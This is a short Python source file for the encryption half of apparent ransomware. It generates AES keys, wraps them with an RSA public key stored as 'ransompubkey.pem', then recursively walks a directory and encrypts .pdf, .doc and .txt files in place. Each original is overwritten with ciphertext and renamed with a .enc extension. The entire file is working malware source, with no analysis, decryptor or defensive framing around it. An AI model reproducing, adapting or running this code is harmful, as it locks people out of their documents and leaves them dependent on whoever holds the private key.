from os import walk, rename
from os.path import join, exists
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from base64 import b64encode, decode

class Encryptor:
    def __init__(self) -> None:
        # checking if public key file exists or not
        if not exists("ransompubkey.pem"):
            print("'ransompubkey.pem' not found..")
            exit(1)

        # file types that the code will check for encryption
        self.file_types = ['.pdf', '.doc', '.txt']

        # generating 256 bit AES symmetric key according to file types
        self.session_key = {key:get_random_bytes(32) for key in self.file_types}
        
        # to clear content of ransomkey_i.bin if any
        open("ransomkey_i.bin", 'w').close()
        
        # storing keys
        for key in self.file_types:
            self.encrypt_and_store(b64encode(self.session_key[key]).decode('utf-8'))

    # to encrypt keys and IVs with RSA public key
    def encrypt_and_store(self, data) -> None:
        # loading public key
        with open("ransompubkey.pem", "rb") as f:
            public_key = RSA.import_key(f.read())

        # instantiating RSA cipher with public key
        cipher_rsa = PKCS1_OAEP.new(public_key)
        # encrypting data with RSA Cipher
        enc_data = cipher_rsa.encrypt(bytes(data, encoding='utf-8'))

        # writing encrypted data to file
        with open("ransomkey_i.bin", "ab") as f:
            f.write(enc_data)

    # to encrypt a file
    def encrypt_file(self, file_path: str, file_name: str, file_type: str) -> None:
        # reading binary of file that is be encrypted
        with open(file_path, "rb") as f:
            data = f.read()
            
        # instantiating AES cipher
        cipher_aes = AES.new(self.session_key[file_type], AES.MODE_CBC)
        
        # encrypting data
        ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))

        # As we hadn't provided any IV so CBC randomly picked an IV
        iv = b64encode(cipher_aes.iv).decode('utf-8')
        encoded_file_name = b64encode(file_name.encode('ascii')).decode('ascii')

        # storing iv and name of file
        self.encrypt_and_store(encoded_file_name + ":" + iv)
        
        # encoding ciphertext
        ciphertext = b64encode(ciphertext).decode('utf-8')

        # storing encrypted binary
        try:
            with open(file_path, "w") as f:
                f.write(ciphertext) 
            rename(file_path, file_path + ".enc") # renaming file (to avoid re-encryption)
            print(file_name, "encrypted")
        except:
            print(file_name, "not encrypted")

    # to encrypt certain type of files in a directory
    def encrypt_files(self, directory: str):
        # finding all the files in the directory recursively
        system = walk(directory, topdown=True)
        for root, dir, files in system:
            for file in files:
                if ".enc" not in file: # if file is not encrypted
                    for file_type in self.file_types: 
                        if file_type in file: # if file is of a certain type that should be encrypted
                            file_path = join(root, file)
                            self.encrypt_file(file_path, file, file_type)
                            break


enc = Encryptor()
enc.encrypt_files("mydirectory")